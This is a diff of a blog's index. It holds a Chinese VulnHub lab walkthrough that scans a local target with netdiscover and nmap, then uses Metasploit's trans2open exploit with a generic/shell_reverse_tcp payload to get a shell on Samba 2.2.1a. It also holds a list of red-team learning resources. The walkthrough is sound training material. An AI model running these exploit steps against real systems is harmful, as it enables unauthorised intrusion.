+<li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
+<li><a class="link" href="https://youtu.be/9cKhZaYecM4?si=v4t-Rware1D48a8Z">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByNlUGtFp.png" alt="image"></li>
+</ul>
+<br>
+<br>
+
+
+<h2 id="步驟一、找到其服務"><a href="#步驟一、找到其服務" class="headerlink" title="步驟一、找到其服務"></a>步驟一、找到其服務</h2><p>首先，先使用ifconfig查看自己的IP。<code>192.168.1.10</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJshOmKYT.png" alt="image"></p>
+<p>使用netdiscover查看本地端的IP尋找靶機。<br><code>sudo netdiscover -r 192.168.1.0/24</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJTDdXKFp.png" alt="image"></p>
+<p>使用nmap查看其服務。<br><code>sudo nmap -A -T4 192.168.1.104</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkJSYmKKT.png" alt="image"></p>
+<br>
+    
+<h2 id="步驟二、尋找漏洞"><a href="#步驟二、尋找漏洞" class="headerlink" title="步驟二、尋找漏洞"></a>步驟二、尋找漏洞</h2><p>Metasploit 框架是一個功能豐富的開源渗透測試框架，其中的 msfconsole 是其<br>主要命令行界面，提供了一個互動式的控制台，用於進行漏洞測試和攻擊模擬。</p>
+<ol>
+<li>探索漏洞：<br>使用 <code>search</code> 指令來搜尋 Metasploit 框架中的漏洞模組。例如，你可以輸入以下指令搜尋特定漏洞： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search &lt;漏洞名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>選擇攻擊模組：<br>使用 use 指令來選擇要使用的攻擊模組。一旦你找到了想要利用的漏洞模組，可以使用以下指令： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use &lt;模組名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>設定攻擊模組參數：<br>使用 set 指令來設定攻擊模組的相關參數，以便定制攻擊的目標和方式。例如： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set &lt;參數名稱&gt; &lt;值&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>執行攻擊：<br>最後，使用 exploit 指令來執行選擇的攻擊模組，觸發相應的攻擊。這將開始模擬或實際執行渗透測試。 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<br>
+<br>
+
+<p><code>139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</code> 很可疑。<br>smbd 是 Samba 軟體套件中的一個核心組件，是 Samba Daemon 的縮寫。Samba 是一個開源的軟體套件，提供了與 Microsoft Windows 互通的 SMB/CIFS 協定的實現。Samba 允許非 Windows 系統（例如 Linux、Unix）與 Windows 系統共享檔案、印表機和其他資源。smbd 是 Samba 中負責實現 SMB（Server Message Block）協定的守護進程，它允許其他機器通過 SMB/CIFS 協定訪問和共享資源。這使得 Linux/Unix 系統能夠擔任文件伺服器，與 Windows 系統協同工作，共享檔案和資源。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1ack4FY6.png" alt="image"><br><br><br>使用 msfconsole 查看。<code>sudo msfconsole</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByKQyEKFp.png" alt="image"><br><br><br>查看<code>search smb_version</code>。使用<code>use 0</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJ7BgNYFT.png" alt="image"><br><br><br><code> options</code>。<br>在 Metasploit 框架中，options 是一個用於查看和配置模組（payload、exploit、auxiliary 等）參數的指令。這個指令允許你檢視目前模組的參數配置狀態，以及進行必要的修改。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJHFbEFta.png" alt="image"><br><br><br>設置<code>RHOSTS</code>參數為<code>192.169.1.104</code>。<br><code>set RHOSTS 192.168.1.104</code>。再<code>show options</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkDkfVttT.png" alt="image"><br><br><br><code>exploit</code>。得到smba版本<code>Samba 2.2.1a</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryKvG4KYp.png" alt="image"><br><br></p>
+<h2 id="步驟三、查找漏洞版本問題"><a href="#步驟三、查找漏洞版本問題" class="headerlink" title="步驟三、查找漏洞版本問題"></a>步驟三、查找漏洞版本問題</h2><p>Google <code>Samba 2.2.1a</code>在msfconsole上<a class="link" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/samba/trans2open">應用<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rySDQEYFp.png" alt="image"></p>
+<p>找到使用<code>trans2open</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByXQSwtt6.png" alt="image"></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search trans2open</span><br><span class="line">use 1</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1k4IvKFa.png" alt="image"></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.1.104</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1La8wKYT.png" alt="image"></p>
+<p><code>exploit</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkgfwDtYa.png" alt="image"><br><br></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyThuwKFa.png" alt="image"><br>對於 generic/shell_reverse_tcp 這樣的 payload，它是一個反向 shell 載荷，通常設計成能夠與目標系統建立反向的 TCP 連接，以提供互動式的 shell 會話。generic 的使用表示這個 payload 將根據攻擊環境的具體情況進行一些通用的調整，以確保它在不同情境下的兼容性。<br><br></p>
+<h2 id="步驟四、驗證身分"><a href="#步驟四、驗證身分" class="headerlink" title="步驟四、驗證身分"></a>步驟四、驗證身分</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyFKOPtKp.png" alt="image"></p>
+]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MyBook</title>
     <url>/2024/12/08/MyBook/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Pratice"><a href="#Pratice" class="headerlink" title="Pratice"></a>Pratice</h3><ul>
@@ -543,9 +543,38 @@
       </tags>
   </entry>
   <entry>
-    <title>SSRF</title>
-    <url>/2024/12/09/SSRF/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+    <title>Red Team</title>
+    <url>/2024/12/08/Red-Team/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="1-專注於滲透測試和攻擊腳本的資源"><a href="#1-專注於滲透測試和攻擊腳本的資源" class="headerlink" title="1. 專注於滲透測試和攻擊腳本的資源"></a><strong>1. 專注於滲透測試和攻擊腳本的資源</strong></h4><h5 id="1-Exploit-Database-Exploit-DB"><a href="#1-Exploit-Database-Exploit-DB" class="headerlink" title="(1) Exploit Database (Exploit-DB)"></a><strong>(1) <a class="link"   href="https://www.exploit-db.com/" >Exploit Database (Exploit-DB)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><h5 id="2-GitHub"><a href="#2-GitHub" class="headerlink" title="(2) GitHub"></a><strong>(2) <a class="link"   href="https://github.com/" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Search: <code>red team scripts</code>、<code>offensive security</code>、<code>post exploitation</code> </p>
+<hr>
+<h4 id="2-專注於紅隊技術的資源"><a href="#2-專注於紅隊技術的資源" class="headerlink" title="2. 專注於紅隊技術的資源"></a><strong>2. 專注於紅隊技術的資源</strong></h4><h5 id="1-Red-Team-Academy"><a href="#1-Red-Team-Academy" class="headerlink" title="(1) Red Team Academy"></a><strong>(1) <a class="link"   href="https://www.redteamacademy.com/" >Red Team Academy<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>專注於紅隊技術學習，提供完整的紅隊作業流程，包括社交工程和後滲透技術等。這些內容幫助學習者根據目標環境設計定制化的攻擊劇本，以及進行紅隊任務中的腳本化自動化操作。</p>
+<h5 id="2-PayloadsAllTheThings"><a href="#2-PayloadsAllTheThings" class="headerlink" title="(2) PayloadsAllTheThings"></a><strong>(2) <a class="link"   href="https://github.com/swisskyrepo/PayloadsAllTheThings" >PayloadsAllTheThings<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>這是一個專注於各種攻擊向量的 GitHub 資源庫，包括 SQL Injection、XSS、SSRF 等攻擊場景。它提供了豐富的 Payload 示例，幫助學習者將這些 Payload 整合到自己的攻擊腳本中，並應用於多種場景。</p>
+<h5 id="3-TrustedSec-Blog"><a href="#3-TrustedSec-Blog" class="headerlink" title="(3) TrustedSec Blog"></a><strong>(3) <a class="link"   href="https://www.trustedsec.com/blog/" >TrustedSec Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>TrustedSec 提供最新的紅隊工具與技術分析，分享實際攻擊場景的案例研究。透過這些資源，學習者能更有效地在紅隊演練中應用工具與腳本。</p>
+<h5 id="4-dmcxblue"><a href="#4-dmcxblue" class="headerlink" title="(4) dmcxblue"></a><strong>(4) <a class="link"   href="https://dmcxblue.net/" >dmcxblue<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>dmcxblue 提供紅隊技術相關的文章和研究，涵蓋多種進階攻擊技術和工具的使用。特別適合想了解攻擊理論和實踐的學習者。</p>
+<h5 id="5-Ired-Team"><a href="#5-Ired-Team" class="headerlink" title="(5) Ired Team"></a><strong>(5) <a class="link"   href="https://www.ired.team/" >Ired Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Ired Team 提供紅隊技術的實踐指南，涵蓋滲透測試和後滲透技術的深入研究，適合學習高階的攻擊操作。</p>
+<h5 id="6-Rawsec-Blog"><a href="#6-Rawsec-Blog" class="headerlink" title="(6) Rawsec Blog"></a><strong>(6) <a class="link"   href="https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/" >Rawsec Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>專注於網絡滲透技術，特別是關於網絡橫向移動和數據隧道化的實踐案例。</p>
+<hr>
+<h4 id="3-模擬演練和學習攻擊腳本的平台"><a href="#3-模擬演練和學習攻擊腳本的平台" class="headerlink" title="3. 模擬演練和學習攻擊腳本的平台"></a><strong>3. 模擬演練和學習攻擊腳本的平台</strong></h4><h5 id="1-Hack-The-Box"><a href="#1-Hack-The-Box" class="headerlink" title="(1) Hack The Box"></a><strong>(1) <a class="link"   href="https://www.hackthebox.com/" >Hack The Box<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Hack The Box 提供一個互動學習平台，專注於紅隊與藍隊的模擬攻擊場景，適合學習如何在實際演練中使用攻擊腳本。它涵蓋從基礎到高級的滲透測試挑戰，幫助學習者針對不同場景進行腳本開發與應用。</p>
+<h5 id="2-VulnHub"><a href="#2-VulnHub" class="headerlink" title="(2) VulnHub"></a><strong>(2) <a class="link"   href="https://www.vulnhub.com/" >VulnHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>VulnHub 提供可下載的靶機映像，讓學習者可以在本地虛擬環境中進行滲透測試演練，從而提升實戰能力。涵蓋多種難度和場景，適合從初學者到高級使用者。</p>
+<h5 id="3-TryHackMe"><a href="#3-TryHackMe" class="headerlink" title="(3) TryHackMe"></a><strong>(3) <a class="link"   href="https://tryhackme.com/" >TryHackMe<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>TryHackMe 提供專門的腳本化攻擊課程，包括 CTF 和專業紅隊技能訓練環境，幫助學習者從基礎腳本開發到複雜攻擊劇本的實踐操作，並結合 <code>pwntools</code> 等工具進行實作。</p>
+<h5 id="4-RangeForce"><a href="#4-RangeForce" class="headerlink" title="(4) RangeForce"></a><strong>(4) <a class="link"   href="https://www.rangeforce.com/" >RangeForce<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>RangeForce 模擬企業場域的防禦與攻擊演練，針對紅隊演練特性提供深度學習環境。學習者可以在此學習如何應對企業防禦措施，並開發和調整針對實際場域的攻擊腳本。</p>
+<h5 id="5-BloodHound"><a href="#5-BloodHound" class="headerlink" title="(5) BloodHound"></a><strong>(5) <a class="link"   href="https://bloodhound.readthedocs.io/" >BloodHound<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>BloodHound 是一個用於內網環境分析的工具，特別針對 Active Directory（AD）環境進行攻擊路徑探索與分析，幫助學習者設計內網滲透策略。</p>
+<h5 id="6-Offensive-Security-Learning-Paths"><a href="#6-Offensive-Security-Learning-Paths" class="headerlink" title="(6) Offensive Security Learning Paths"></a><strong>(6) <a class="link"   href="https://www.offsec.com/learning/paths/" >Offensive Security Learning Paths<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Offensive Security 提供結構化的學習路徑，幫助學習者從基礎滲透測試技能逐步提升到高級攻擊技術。</p>
+<h5 id="7-GOAD-GitHub"><a href="#7-GOAD-GitHub" class="headerlink" title="(7) GOAD (GitHub)"></a><strong>(7) <a class="link"   href="https://github.com/Orange-Cyberdefense/GOAD" >GOAD (GitHub)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>GOAD 是一個 Active Directory 滲透測試學習實驗室，專注於內網攻擊和紅隊實踐，幫助學習者深入了解 AD 的攻擊技巧。</p>
+<hr>
+<h4 id="4-特定工具與框架學習資源"><a href="#4-特定工具與框架學習資源" class="headerlink" title="4. 特定工具與框架學習資源"></a><strong>4. 特定工具與框架學習資源</strong></h4><h5 id="1-Cobalt-Strike-Documentation"><a href="#1-Cobalt-Strike-Documentation" class="headerlink" title="(1) Cobalt Strike Documentation"></a><strong>(1) <a class="link"   href="https://www.cobaltstrike.com/support/user-manuals" >Cobalt Strike Documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>提供詳細的 Cobalt Strike 使用指南，特別是 Aggressor Scripts 的編寫與應用教學。這幫助學習者了解攻擊腳本的開發流程，並結合現有工具實現任務的自動化腳本設計。</p>
+<h5 id="2-Metasploit-Unleashed"><a href="#2-Metasploit-Unleashed" class="headerlink" title="(2) Metasploit Unleashed"></a><strong>(2) <a class="link"   href="https://www.offensive-security.com/metasploit-unleashed/" >Metasploit Unleashed<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Metasploit 的官方教學，涵蓋腳本模組的開發與應用。學習者可以透過這些內容掌握如何根據需求設計自定義攻擊腳本，以及熟悉 Metasploit 框架的腳本化操作流程。</p>
+<h5 id="3-MITRE-ATT-CK-Framework"><a href="#3-MITRE-ATT-CK-Framework" class="headerlink" title="(3) MITRE ATT&amp;CK Framework"></a><strong>(3) <a class="link"   href="https://attack.mitre.org/" >MITRE ATT&amp;CK Framework<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>提供標準化的攻擊技術與場景資料庫，幫助學習者模擬 ATT&amp;CK 技術腳本的實現，並設計符合紅隊演練場景的攻擊腳本。</p>
+<h5 id="4-Empire"><a href="#4-Empire" class="headerlink" title="(4) Empire"></a><strong>(4) <a class="link"   href="https://github.com/BC-SECURITY/Empire" >Empire<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Empire 是一個強大的後滲透測試框架，支持腳本化的滲透測試活動，適合進行模擬攻擊與自動化操作。</p>
+<h5 id="5-MITRE-Caldera"><a href="#5-MITRE-Caldera" class="headerlink" title="(5) MITRE Caldera"></a><strong>(5) <a class="link"   href="https://caldera.mitre.org/" >MITRE Caldera<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>MITRE Caldera 是一個自動化紅隊模擬框架，專注於模擬真實的攻擊行為，幫助學習者測試與了解各種攻擊技術。適合用於模擬企業場域的攻擊活動。</p>
+<h5 id="6-Atomic-Red-Team"><a href="#6-Atomic-Red-Team" class="headerlink" title="(6) Atomic Red Team"></a><strong>(6) <a class="link"   href="https://github.com/redcanaryco/atomic-red-team" >Atomic Red Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Atomic Red Team 提供一組開放式的攻擊技術測試框架，幫助學習者快速測試與模擬常見的攻擊技巧，並結合 MITRE ATT&amp;CK 進行實踐。</p>
+<ul>
+<li><a class="link"   href="https://devco.re/blog/2024/07/09/guide-to-applying-for-red-team-specialist/" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>other</tag>
+      </tags>
   </entry>
   <entry>
     <title>SQL-Injection</title>
@@ -1003,6 +1032,11 @@ Since the original query returns two columns and only the second column can stor
       </tags>
   </entry>
   <entry>
+    <title>SSRF</title>
+    <url>/2024/12/09/SSRF/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+  </entry>
+  <entry>
     <title>picoCTF</title>
     <url>/2024/11/30/picoCTF/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p><a class="link"   href="https://hackmd.io/@dinosaur/HJpK08aQh" >https://hackmd.io/@dinosaur/HJpK08aQh<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
@@ -1011,41 +1045,6 @@ Since the original query returns two columns and only the second column can stor
 ]]></content>
       <tags>
         <tag>picoCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Red Team</title>
-    <url>/2024/12/08/Red-Team/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr>
-<h2 id="title-Red-Teamdate-2024-12-08-21-24-15tags-otherthumbnail-https-w-wallhaven-cc-full-01-wallhaven-01y1zv-png"><a href="#title-Red-Teamdate-2024-12-08-21-24-15tags-otherthumbnail-https-w-wallhaven-cc-full-01-wallhaven-01y1zv-png" class="headerlink" title="title: Red Teamdate: 2024-12-08 21:24:15tags: otherthumbnail: https://w.wallhaven.cc/full/01/wallhaven-01y1zv.png"></a>title: Red Team<br>date: 2024-12-08 21:24:15<br>tags: other<br>thumbnail: <a class="link"   href="https://w.wallhaven.cc/full/01/wallhaven-01y1zv.png" >https://w.wallhaven.cc/full/01/wallhaven-01y1zv.png<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h2><h4 id="1-專注於滲透測試和攻擊腳本的資源"><a href="#1-專注於滲透測試和攻擊腳本的資源" class="headerlink" title="1. 專注於滲透測試和攻擊腳本的資源"></a><strong>1. 專注於滲透測試和攻擊腳本的資源</strong></h4><h5 id="1-Exploit-Database-Exploit-DB"><a href="#1-Exploit-Database-Exploit-DB" class="headerlink" title="(1) Exploit Database (Exploit-DB)"></a><strong>(1) <a class="link"   href="https://www.exploit-db.com/" >Exploit Database (Exploit-DB)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><h5 id="2-GitHub"><a href="#2-GitHub" class="headerlink" title="(2) GitHub"></a><strong>(2) <a class="link"   href="https://github.com/" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Search: <code>red team scripts</code>、<code>offensive security</code>、<code>post exploitation</code> </p>
-<hr>
-<h4 id="2-專注於紅隊技術的資源"><a href="#2-專注於紅隊技術的資源" class="headerlink" title="2. 專注於紅隊技術的資源"></a><strong>2. 專注於紅隊技術的資源</strong></h4><h5 id="1-Red-Team-Academy"><a href="#1-Red-Team-Academy" class="headerlink" title="(1) Red Team Academy"></a><strong>(1) <a class="link"   href="https://www.redteamacademy.com/" >Red Team Academy<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>專注於紅隊技術學習，提供完整的紅隊作業流程，包括社交工程和後滲透技術等。這些內容幫助學習者根據目標環境設計定制化的攻擊劇本，以及進行紅隊任務中的腳本化自動化操作。</p>
-<h5 id="2-PayloadsAllTheThings"><a href="#2-PayloadsAllTheThings" class="headerlink" title="(2) PayloadsAllTheThings"></a><strong>(2) <a class="link"   href="https://github.com/swisskyrepo/PayloadsAllTheThings" >PayloadsAllTheThings<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>這是一個專注於各種攻擊向量的 GitHub 資源庫，包括 SQL Injection、XSS、SSRF 等攻擊場景。它提供了豐富的 Payload 示例，幫助學習者將這些 Payload 整合到自己的攻擊腳本中，並應用於多種場景。</p>
-<h5 id="3-TrustedSec-Blog"><a href="#3-TrustedSec-Blog" class="headerlink" title="(3) TrustedSec Blog"></a><strong>(3) <a class="link"   href="https://www.trustedsec.com/blog/" >TrustedSec Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>TrustedSec 提供最新的紅隊工具與技術分析，分享實際攻擊場景的案例研究。透過這些資源，學習者能更有效地在紅隊演練中應用工具與腳本。</p>
-<h5 id="4-dmcxblue"><a href="#4-dmcxblue" class="headerlink" title="(4) dmcxblue"></a><strong>(4) <a class="link"   href="https://dmcxblue.net/" >dmcxblue<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>dmcxblue 提供紅隊技術相關的文章和研究，涵蓋多種進階攻擊技術和工具的使用。特別適合想了解攻擊理論和實踐的學習者。</p>
-<h5 id="5-Ired-Team"><a href="#5-Ired-Team" class="headerlink" title="(5) Ired Team"></a><strong>(5) <a class="link"   href="https://www.ired.team/" >Ired Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Ired Team 提供紅隊技術的實踐指南，涵蓋滲透測試和後滲透技術的深入研究，適合學習高階的攻擊操作。</p>
-<h5 id="6-Rawsec-Blog"><a href="#6-Rawsec-Blog" class="headerlink" title="(6) Rawsec Blog"></a><strong>(6) <a class="link"   href="https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/" >Rawsec Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>專注於網絡滲透技術，特別是關於網絡橫向移動和數據隧道化的實踐案例。</p>
-<hr>
-<h4 id="3-模擬演練和學習攻擊腳本的平台"><a href="#3-模擬演練和學習攻擊腳本的平台" class="headerlink" title="3. 模擬演練和學習攻擊腳本的平台"></a><strong>3. 模擬演練和學習攻擊腳本的平台</strong></h4><h5 id="1-Hack-The-Box"><a href="#1-Hack-The-Box" class="headerlink" title="(1) Hack The Box"></a><strong>(1) <a class="link"   href="https://www.hackthebox.com/" >Hack The Box<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Hack The Box 提供一個互動學習平台，專注於紅隊與藍隊的模擬攻擊場景，適合學習如何在實際演練中使用攻擊腳本。它涵蓋從基礎到高級的滲透測試挑戰，幫助學習者針對不同場景進行腳本開發與應用。</p>
-<h5 id="2-VulnHub"><a href="#2-VulnHub" class="headerlink" title="(2) VulnHub"></a><strong>(2) <a class="link"   href="https://www.vulnhub.com/" >VulnHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>VulnHub 提供可下載的靶機映像，讓學習者可以在本地虛擬環境中進行滲透測試演練，從而提升實戰能力。涵蓋多種難度和場景，適合從初學者到高級使用者。</p>
-<h5 id="3-TryHackMe"><a href="#3-TryHackMe" class="headerlink" title="(3) TryHackMe"></a><strong>(3) <a class="link"   href="https://tryhackme.com/" >TryHackMe<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>TryHackMe 提供專門的腳本化攻擊課程，包括 CTF 和專業紅隊技能訓練環境，幫助學習者從基礎腳本開發到複雜攻擊劇本的實踐操作，並結合 <code>pwntools</code> 等工具進行實作。</p>
-<h5 id="4-RangeForce"><a href="#4-RangeForce" class="headerlink" title="(4) RangeForce"></a><strong>(4) <a class="link"   href="https://www.rangeforce.com/" >RangeForce<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>RangeForce 模擬企業場域的防禦與攻擊演練，針對紅隊演練特性提供深度學習環境。學習者可以在此學習如何應對企業防禦措施，並開發和調整針對實際場域的攻擊腳本。</p>
-<h5 id="5-BloodHound"><a href="#5-BloodHound" class="headerlink" title="(5) BloodHound"></a><strong>(5) <a class="link"   href="https://bloodhound.readthedocs.io/" >BloodHound<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>BloodHound 是一個用於內網環境分析的工具，特別針對 Active Directory（AD）環境進行攻擊路徑探索與分析，幫助學習者設計內網滲透策略。</p>
-<h5 id="6-Offensive-Security-Learning-Paths"><a href="#6-Offensive-Security-Learning-Paths" class="headerlink" title="(6) Offensive Security Learning Paths"></a><strong>(6) <a class="link"   href="https://www.offsec.com/learning/paths/" >Offensive Security Learning Paths<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Offensive Security 提供結構化的學習路徑，幫助學習者從基礎滲透測試技能逐步提升到高級攻擊技術。</p>
-<h5 id="7-GOAD-GitHub"><a href="#7-GOAD-GitHub" class="headerlink" title="(7) GOAD (GitHub)"></a><strong>(7) <a class="link"   href="https://github.com/Orange-Cyberdefense/GOAD" >GOAD (GitHub)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>GOAD 是一個 Active Directory 滲透測試學習實驗室，專注於內網攻擊和紅隊實踐，幫助學習者深入了解 AD 的攻擊技巧。</p>
-<hr>
